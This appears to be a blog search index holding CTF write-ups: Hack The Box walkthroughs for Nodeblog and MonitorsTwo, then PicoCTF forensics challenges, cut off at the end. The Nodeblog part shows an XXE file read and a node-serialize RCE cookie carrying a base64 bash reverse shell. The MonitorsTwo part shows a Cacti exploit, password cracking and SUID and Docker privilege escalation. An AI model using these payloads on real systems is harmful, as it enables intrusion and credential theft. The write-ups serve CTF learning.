this:root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinadmin:x:1000:1000:admin:/home/admin:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologinonly user that has /bin/bashis adminSince server.js is commonly used for NodeJS applications, we update our payload to target the /opt/blog/server.js file.Code will be like&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY help SYSTEM \"file:///opt/blod/server.js\"&gt;]&gt;&lt;post&gt;&lt;title&gt;shavigio&lt;/title&gt;&lt;description&gt;Read File&lt;/description&gt;&lt;markdown&gt;&amp;help;&lt;/markdown&gt;&lt;/post&gt;After uploading i got this:const express = require('express')const mongoose = require('mongoose')const Article = require('./models/article')const articleRouter = require('./routes/articles')const loginRouter = require('./routes/login')const serialize = require('node-serialize')const methodOverride = require('method-override')const fileUpload = require('express-fileupload')const cookieParser = require('cookie-parser');const crypto = require('crypto')const cookie_secret = \"UHC-SecretCookie\"//var session = require('express-session');const app = express()mongoose.connect('mongodb://localhost/blog')app.set('view engine', 'ejs')app.use(express.urlencoded({ extended: false }))app.use(methodOverride('_method'))app.use(fileUpload())app.use(express.json());app.use(cookieParser());//app.use(session({secret: \"UHC-SecretKey-123\"}));function authenticated(c) { if (typeof c == 'undefined') return false c = serialize.unserialize(c) if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){ return true } else { return false }}app.get('/', async (req, res) =&gt; { const articles = await Article.find().sort({ createdAt: 'desc' }) res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })})app.use('/articles', articleRouter)app.use('/login', loginRouter)app.listen(5000)From here we get that cookie is url encoded jsonWhich if we url-decode get :%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D{\"user\":\"admin\",\"sign\":\"23e112072945418601deb47d9a6c7de8\"}There is an exploit for node-serializewhich allows us to do RCE and in this instance we should change the cookie or add that payload to the cookie. To get reverse shellwe need to inject payload then do base64encoding and write that in this code.Cookie: auth={\"user\":\"admin\",\"sign\":\"23e112072945418601deb47d9a6c7de8\",\"rce\":\"_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\'&lt;your_code&gt;\\', function(error, stdout, stderr) { console.log(stdout) });}()\"}Then do url-encode all charactersFor me it was echo -n \"bash -i &gt;&amp; /dev/tcp/10.10.16.6/1234 0&gt;&amp;1\" | base64YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi8xMjM0ICAwPiYxCookie: auth={\"user\":\"admin\",\"sign\":\"23e112072945418601deb47d9a6c7de8\",\"rce\":\"_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\echo -n 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi8xMjM0ICAwPiYx|base64 -d |bash'\\', function(error, stdout, stderr) { console.log(stdout) });}()\"}# url-encode all charsThis is how burpsuite payloadshould look like:```GET / HTTP/1.1Host: 10.10.11.139:5000Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8Sec-GPC: 1Cookie: auth=%7b%22%75%73%65%72%22%3a%22%61%64%6d%69%6e%22%2c%22%73%69%67%6e%22%3a%22%32%33%65%31%31%32%30%37%32%39%34%35%34%31%38%36%30%31%64%65%62%34%37%64%39%61%36%63%37%64%65%38%22%2c%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%72%65%71%75%69%72%65%28%5c%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%5c%22%29%2e%65%78%65%63%28%5c%22%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%32%4c%7a%45%79%4d%7a%51%67%4d%44%34%6d%4d%51%3d%3d%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%5c%22%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7dAccept-Language: en-US,enReferer: http://10.10.11.139:5000/articles/xmlAccept-Encoding: gzip, deflate, brIf-None-Match: W/”a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA”Connection: keep-aliveThen send itAfter got the connection on `netcat````bashrlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.6] from (UNKNOWN) [10.10.11.139] 59546bash: cannot set terminal process group (833): Inappropriate ioctl for devicebash: no job control in this shellTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.bash: /home/admin/.bashrc: Permission deniedadmin@nodeblog:/opt/blog$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullTo run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.admin@nodeblog:/opt/blog$ ididuid=1000(admin) gid=1000(admin) groups=1000(admin)admin@nodeblog:/opt/blog$ ls -la /homels -la /hometotal 16drwxr-xr-x 1 root root 10 Dec 27 2021 .drwxr-xr-x 1 root root 180 Dec 27 2021 ..drw-r--r-- 1 admin admin 220 Jan 3 2022 adminadmin@nodeblog:/opt/blog$ chmod +x /home/adminchmod +x /home/adminadmin@nodeblog:/opt/blog$ cat /home/admin/user.txtcat /home/admin/user.txt4364ebd88bf3569f41984a1fa498b943admin@nodeblog:/opt/blog$ ss -tlnpss -tlnpState Recv-Q Send-Q Local Address:Port Peer Address:Port ProcessLISTEN 0 4096 127.0.0.1:27017 0.0.0.0:*LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*LISTEN 0 128 0.0.0.0:22 0.0.0.0:*LISTEN 0 128 [::]:22 [::]:*LISTEN 0 511 *:5000 *:* users:((\"node /opt/blog/\",pid=833,fd=20))admin@nodeblog:/opt/blog$ mongomongoMongoDB shell version v3.6.8connecting to: mongodb://127.0.0.1:27017&gt; show dbsshshow dbsadmin 0.000GBblog 0.000GBconfig 0.000GBlocal 0.000GB&gt; use blogususe blogswitched to db blog&gt; show collectionsshshow collectionsarticlesusers&gt; db.users.find()dbdb.users.find(){ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }&gt; exitexexitbyeadmin@nodeblog:/opt/blog$ sudo -lsudo -l[sudo] password for admin: IppsecSaysPleaseSubscribeMatching Defaults entries for admin on nodeblog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser admin may run the following commands on nodeblog: (ALL) ALL (ALL : ALL) ALLadmin@nodeblog:/opt/blog$ sudo susudo suroot@nodeblog:/opt/blog# cat /root/root.txtcat /root/root.txt523ce040c4e3d05b66d0fbd8298e088fUser Flag is: 4364ebd88bf3569f41984a1fa498b943Root Flag is: 523ce040c4e3d05b66d0fbd8298e088f***" }, { "title": "MonitorsTwo from HTB", "url": "/posts/MonitorsTwo-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "MonitorsTwo from HTBnmapreturned this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Login to Cacti|_http-server-header: nginx/1.18.0 (Ubuntu)access the site via IPand we find that it’s cacti 1.2.22version which is exploitable. After searching i found: https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.221. rlwrap nc -nlvp 12342.python3 CVE-2022-46169-cacti-1.2.22-exploit.py -u http://10.10.11.211/ --LHOST=10.10.16.5 --LPORT=1234Checking...The target is vulnerable. Exploiting...Bruteforcing the host_id and local_data_idsBruteforce Success!!3.rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.211] 51012bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellwww-data@50bca5e748b0:/var/www/html$ script /dev/null -c bashscript /dev/null -c bashScript started, output log file is '/dev/null'.www-data@50bca5e748b0:/var/www/html$spawn /bin/bashscript /dev/null -c bashThere is an .dockerenvfile in /that means we are in docker container. We proceed with our enumeration by searching for files with the SUID bit set.find / -perm /4000 2&gt;/dev/null/usr/bin/gpasswd/usr/bin/passwd/usr/bin/chsh/usr/bin/chfn/usr/bin/newgrp/sbin/capsh/bin/mount/bin/umount/bin/sucapshcan be used to become the root:capsh --gid=0 --uid=0 --capsh --gid=0 --uid=0 --root@50bca5e748b0:/var/www/html#in /directory there is entrypoint.shwhich i guess shouldn’t be but i used it and got that there is an mysql databasewhich can be accessed:root@50bca5e748b0:/# cat entcat entrypoint.sh#!/bin/bashset -exwait-for-it db:3306 -t 300 -- echo \"database is connected\"if [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sqlThen i connected to mysql:root@50bca5e748b0:/# mysql --host=db --user=root --password=root cactishow databases;...........MySQL [cacti]&gt; use cacti;use cacti;Database changedMySQL [cacti]&gt; show tables;show tables;............MySQL [cacti]&gt; select * from user_auth;select * from user_auth;................| 4 | marcus | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | 0 | Marcus Brune | marcus@monitorstwo.htb |So there is an user named marcusand there is an hashed password. Crack it with John the ripperand get the password:john -w=/usr/share/wordlists/rockyou.txt hash.................funkymonkey (?)Then connect to ssh:ssh marcus@10.10.11.211marcus@monitorstwo:~$ cat user.txt31a9e1718c1fae3c62ed009bc408f4f4User Flag is: 31a9e1718c1fae3c62ed009bc408f4f4***marcus@monitorstwo:~$ sudo -l[sudo] password for marcus:Sorry, user marcus may not run sudo on localhost.That’s bad.marcus@monitorstwo:~$ cat /var/mail/marcusFrom: administrator@monitorstwo.htbTo: all@monitorstwo.htbSubject: Security Bulletin - Three Vulnerabilities to be Aware OfDear all,We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.Best regards,AdministratorCISOMonitor TwoSecurity TeamThis is something we will need.First two is useless for us in this moment.We’ll need third CVE:docker --versionDocker version 20.10.5+dfsg1, build 55c4c88This is exploitable.We can employ findmnt to display the mounts connected to the system, including those used by Docker containers.findmntTARGET SOURCE FSTYPE OPTIONS├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged│ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUT├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm│ shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged│ overlay overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMX└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536kIn netcatconnection where we are rootfind which docker is used for cactiwith mountand it is:upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)So we will have to go to /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/mergedSo we will be at the same directory as we are in netcat.If you create file in that directory you will see it in other terminal too.With root in netcatcopy /bin/bashto /and make it executable by userto use it to become the root.root@50bca5e748b0:/# cp /bin/bash /cp /bin/bash /root@50bca5e748b0:/# chmod u+s /bashchmod u+s /bash # in netcatNow in ssh:marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bash -pbash-5.1#We are now root.*Root Flag is: d37df4d2b25c038065fc5602d0368d7b**" }, { "title": "mobpsycho from PicoCTF", "url": "/posts/Mob-psycho-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "mobpsycho from PicoCTFpage DescritpionCan you handle APKs?Download the android apk here. HintsDid you know you can unzip APK files?So If you download file and unzipit you will see bunch of files and use this command:find . -type f -name \"flag.txt\"this will find flag.txt in:./res/color/flag.txtnow read it:$ cat ./res/color/flag.txt7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f37303364643965667ddecrypt it with cyberchef and you will get the flag:picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_703dd9ef}" }, { "title": "MilkSlap from PicoCTF", "url": "/posts/Milkslap-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "MilkSlap from PicoCTFpage Description🥛This is a site and there is .PNGphoto so let’s download it:wget http://mercury.picoctf.net:7585/concat_v.pngIt’s a .png file so lets use zsteg on it:$ zsteg a.png /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:303:in `upto': stack level too deep (SystemStackError)\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:303:in `decoded_bytes'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:319:in `block in decoded_bytes'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `upto'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `decoded_bytes'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte'\tfrom /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte'\t ... 9483 levels...\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg.rb:26:in `run'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/bin/zsteg:8:in `&lt;top (required)&gt;'\tfrom /usr/local/bin/zsteg:25:in `load'\tfrom /usr/local/bin/zsteg:25:in `&lt;main&gt;'\tIt doesn’t work, I don’t know why but i started searching on the internet and found the explanation:$ RUBY_THREAD_VM_STACK_SIZE=500000000 zsteg a.png imagedata .. text: \"\\n\\n\\n\\n\\n\\n\\t\\t\"b1,b,lsb,xy .. text: \"picoCTF{imag3_m4n1pul4t10n_sl4p5}\\n\"b1,bgr,lsb,xy .. /var/lib/gems/3.1.0/gems/iostruct-0.1.2/lib/iostruct.rb:136:in `block in inspect': undefined method `type' for nil:NilClass (NoMethodError) when f.type == Integer ^^^^^\tfrom /var/lib/gems/3.1.0/gems/iostruct-0.1.2/lib/iostruct.rb:133:in `each'\tfrom /var/lib/gems/3.1.0/gems/iostruct-0.1.2/lib/iostruct.rb:133:in `map'\tfrom /var/lib/gems/3.1.0/gems/iostruct-0.1.2/lib/iostruct.rb:133:in `inspect'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker/wbstego.rb:41:in `to_s'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:291:in `puts'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:291:in `puts'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:291:in `show_result'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:326:in `process_result'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:271:in `check_channels'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:191:in `check_channels'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:118:in `block (4 levels) in check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:118:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:118:in `block (3 levels) in check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:99:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:99:in `block (2 levels) in check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:98:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:98:in `block in check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:97:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/checker.rb:97:in `check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:258:in `check'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:172:in `block (2 levels) in run'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:168:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:168:in `block in run'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:161:in `each'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:161:in `each_with_index'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg/cli/cli.rb:161:in `run'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg.rb:26:in `run'\tfrom /var/lib/gems/3.1.0/gems/zsteg-0.2.13/bin/zsteg:8:in `&lt;top (required)&gt;'\tfrom /usr/local/bin/zsteg:25:in `load'\tfrom /usr/local/bin/zsteg:25:in `&lt;main&gt;'And The flag is :picoCTF{imag3_m4n1pul4t10n_sl4p5}" }, { "title": "MacroHard WeakEdge from PicoCTF", "url": "/posts/MacroHard-WeakEdge-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "MacroHard WeakEdge from PicoCTFpage DescriptionI’ve hidden a flag in this file. Can you find it? Forensics is fun.pptmWe download this file and just exploring it we can’t find the file, so maybe it’s hidden. After little searching .pptm file can be .zip so let’s try it.$ unzip l.pptm Archive: l.pptm inflating: [Content_Types].xml inflating: _rels/.rels inflating: ppt/presentation.xml inflating: ppt/slides/_rels/slide46.xml.rels inflating: ppt/slides/slide1.xml inflating: ppt/slides/slide2.xml inflating: ppt/slides/slide3.xml inflating: ppt/slides/slide4.xml inflating: ppt/slides/slide5.xml inflating: ppt/slides/slide6.xml inflating: ppt/slides/slide7.xml inflating: ppt/slides/slide8.xml inflating: ppt/slides/slide9.xml inflating: ppt/slides/slide10.xml inflating: ppt/slides/slide11.xml inflating: ppt/slides/slide12.xml inflating: ppt/slides/slide13.xml inflating: ppt/slides/slide14.xml inflating: ppt/slides/slide15.xml inflating: ppt/slides/slide16.xml inflating: ppt/slides/slide17.xml inflating: ppt/slides/slide18.xml inflating: ppt/slides/slide19.xml inflating: ppt/slides/slide20.xml inflating: ppt/slides/slide21.xml inflating: ppt/slides/slide22.xml inflating: ppt/slides/slide23.xml inflating: ppt/slides/slide24.xml inflating: ppt/slides/slide25.xml inflating: ppt/slides/slide26.xml inflating: ppt/slides/slide27.xml inflating: ppt/slides/slide28.xml inflating: ppt/slides/slide29.xml inflating: ppt/slides/slide30.xml inflating: ppt/slides/slide31.xml inflating: ppt/slides/slide32.xml inflating: ppt/slides/slide33.xml inflating: ppt/slides/slide34.xml inflating: ppt/slides/slide35.xml inflating: ppt/slides/slide36.xml inflating: ppt/slides/slide37.xml inflating: ppt/slides/slide38.xml inflating: ppt/slides/slide39.xml inflating: ppt/slides/slide40.xml inflating: ppt/slides/slide41.xml inflating: ppt/slides/slide42.xml inflating: ppt/slides/slide43.xml inflating: ppt/slides/slide44.xml inflating: ppt/slides/slide45.xml inflating: ppt/slides/slide46.xml inflating: ppt/slides/slide47.xml inflating: ppt/slides/slide48.xml inflating: ppt/slides/slide49.xml inflating: ppt/slides/slide50.xml inflating: ppt/slides/slide51.xml inflating: ppt/slides/slide52.xml inflating: ppt/slides/slide53.xml inflating: ppt/slides/slide54.xml inflating: ppt/slides/slide55.xml inflating: ppt/slides/slide56.xml inflating: ppt/slides/slide57.xml inflating: ppt/slides/slide58.xml inflating: ppt/slides/_rels/slide47.xml.rels inflating: ppt/slides/_rels/slide48.xml.rels inflating: ppt/slides/_rels/slide49.xml.rels inflating: ppt/slides/_rels/slide50.xml.rels inflating: ppt/slides/_rels/slide32.xml.rels inflating: ppt/slides/_rels/slide52.xml.rels inflating: ppt/slides/_rels/slide53.xml.rels inflating: ppt/slides/_rels/slide54.xml.rels inflating: ppt/slides/_rels/slide55.xml.rels inflating: ppt/slides/_rels/slide56.xml.rels inflating: ppt/slides/_rels/slide57.xml.rels inflating: ppt/slides/_rels/slide58.xml.rels inflating: ppt/slides/_rels/slide51.xml.rels inflating: ppt/slides/_rels/slide13.xml.rels inflating: ppt/_rels/presentation.xml.rels inflating: ppt/slides/_rels/slide1.xml.rels inflating: ppt/slides/_rels/slide2.xml.rels inflating: ppt/slides/_rels/slide3.xml.rels inflating: ppt/slides/_rels/slide4.xml.rels inflating: ppt/slides/_rels/slide5.xml.rels inflating: ppt/slides/_rels/slide6.xml.rels inflating: ppt/slides/_rels/slide7.xml.rels inflating: ppt/slides/_rels/slide8.xml.rels inflating: ppt/slides/_rels/slide9.xml.rels inflating: ppt/slides/_rels/slide10.xml.rels inflating: ppt/slides/_rels/slide11.xml.rels inflating: ppt/slides/_rels/slide12.xml.rels inflating: ppt/slides/_rels/slide14.xml.rels inflating: ppt/slides/_rels/slide15.xml.rels inflating: ppt/slides/_rels/slide16.xml.rels inflating: ppt/slides/_rels/slide17.xml.rels inflating: ppt/slides/_rels/slide18.xml.rels inflating: ppt/slides/_rels/slide19.xml.rels inflating: ppt/slides/_rels/slide20.xml.rels inflating: ppt/slides/_rels/slide21.xml.rels inflating: ppt/slides/_rels/slide22.xml.rels inflating: ppt/slides/_rels/slide23.xml.rels inflating: ppt/slides/_rels/slide24.xml.rels inflating: ppt/slides/_rels/slide25.xml.rels inflating: ppt/slides/_rels/slide26.xml.rels inflating: ppt/slides/_rels/slide27.xml.rels inflating: ppt/slides/_rels/slide28.xml.rels inflating: ppt/slides/_rels/slide29.xml.rels inflating: ppt/slides/_rels/slide30.xml.rels inflating: ppt/slides/_rels/slide31.xml.rels inflating: ppt/slides/_rels/slide33.xml.rels inflating: ppt/slides/_rels/slide34.xml.rels inflating: ppt/slides/_rels/slide35.xml.rels inflating: ppt/slides/_rels/slide36.xml.rels inflating: ppt/slides/_rels/slide37.xml.rels inflating: ppt/slides/_rels/slide38.xml.rels inflating: ppt/slides/_rels/slide39.xml.rels inflating: ppt/slides/_rels/slide40.xml.rels inflating: ppt/slides/_rels/slide41.xml.rels inflating: ppt/slides/_rels/slide42.xml.rels inflating: ppt/slides/_rels/slide43.xml.rels inflating: ppt/slides/_rels/slide44.xml.rels inflating: ppt/slides/_rels/slide45.xml.rels inflating: ppt/slideMasters/slideMaster1.xml inflating: ppt/slideLayouts/slideLayout1.xml inflating: ppt/slideLayouts/slideLayout2.xml inflating: ppt/slideLayouts/slideLayout3.xml inflating: ppt/slideLayouts/slideLayout4.xml inflating: ppt/slideLayouts/slideLayout5.xml inflating: ppt/slideLayouts/slideLayout6.xml inflating: ppt/slideLayouts/slideLayout7.xml inflating: ppt/slideLayouts/slideLayout8.xml inflating: ppt/slideLayouts/slideLayout9.xml inflating: ppt/slideLayouts/slideLayout10.xml inflating: ppt/slideLayouts/slideLayout11.xml inflating: ppt/slideMasters/_rels/slideMaster1.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout1.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout2.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout3.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout4.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout5.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout6.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout7.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout8.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout9.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout10.xml.rels inflating: ppt/slideLayouts/_rels/slideLayout11.xml.rels inflating: ppt/theme/theme1.xml extracting: docProps/thumbnail.jpeg inflating: ppt/vbaProject.bin inflating: ppt/presProps.xml inflating: ppt/viewProps.xml inflating: ppt/tableStyles.xml inflating: docProps/core.xml inflating: docProps/app.xml inflating: ppt/slideMasters/hiddenThe last file is interesting —&gt; ppt/slideMasters/hiddenIt’s not directory, so let’s use cat on it and we get this:$ cat ppt/slideMasters/hiddenZ m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f QLet’s go to this site: hash_identifier and input our given 